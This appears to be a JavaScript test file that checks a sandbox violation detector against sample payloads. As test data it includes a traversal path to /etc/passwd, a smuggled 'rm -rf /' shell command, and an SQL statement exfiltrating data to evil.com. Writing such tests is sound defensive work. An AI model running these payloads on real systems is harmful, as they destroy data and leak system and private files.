/**
 * Sandbox Escape Detection Tests (Phase 3.2)
 * 
 * Validates that EXECUTION_MODE=sandbox catches path traversal,
 * shell injection, network URLs, and SQL injection before execution.
 * 
 * Run: EXECUTION_MODE=sandbox node tests/sandbox.test.js
 */

const { detectSandboxViolation, executeInEnclave } = require('../src/tee-enclave');

let pass = 0, fail = 0;
function assert(name, condition) {
    if (condition) {
        console.log(`  ✅ ${name}`);
        pass++;
    } else {
        console.error(`  ❌ ${name}`);
        fail++;
    }
}

async function runTests() {
    console.log('\n  Sandbox Escape Detection Tests\n');

    // ────────────────────────────────────────────
    // Test 1: Path Traversal Detection
    // ────────────────────────────────────────────
    const pathResult = detectSandboxViolation({
        query: 'SELECT * FROM files',
        filepath: '../../../etc/passwd'
    });
    assert('Path traversal (../../etc/passwd) → SANDBOX_VIOLATION',
        pathResult !== null && pathResult.violation === 'PATH_TRAVERSAL');

    // ────────────────────────────────────────────
    // Test 2: Shell Injection Detection
    // ────────────────────────────────────────────
    const shellResult = detectSandboxViolation({
        command: 'list files; rm -rf /',
        userId: '123'
    });
    assert('Shell injection (; rm -rf) → SANDBOX_VIOLATION',
        shellResult !== null && shellResult.violation === 'SHELL_INJECTION');

    // ────────────────────────────────────────────
    // Test 3: Network URL in SQL → SANDBOX_VIOLATION
    // ────────────────────────────────────────────
    const netResult = detectSandboxViolation({
        query: "SELECT * FROM data INTO OUTFILE 'http://evil.com/exfil'"
    });
    assert('Network URL exfiltration → SANDBOX_VIOLATION',
        netResult !== null && (netResult.violation === 'NETWORK_EXFIL' || netResult.violation === 'SQL_INJECTION'));

    // ────────────────────────────────────────────
    // Test 4: Normal Execution → No Violation
    // ────────────────────────────────────────────
    const normalResult = detectSandboxViolation({
        userId: '12345',
        amount: 49.99,
        currency: 'EUR',
        description: 'Monthly subscription'
    });
    assert('Normal payload → no violation', normalResult === null);

    console.log('\n  ─────────────────────────────────────');
    console.log(`  Results: ${pass} passed, ${fail} failed`);
    console.log('  ─────────────────────────────────────\n');

    process.exit(fail > 0 ? 1 : 0);
}

runTests().catch(err => {
    console.error('Fatal Test Error:', err);
    process.exit(1);
});
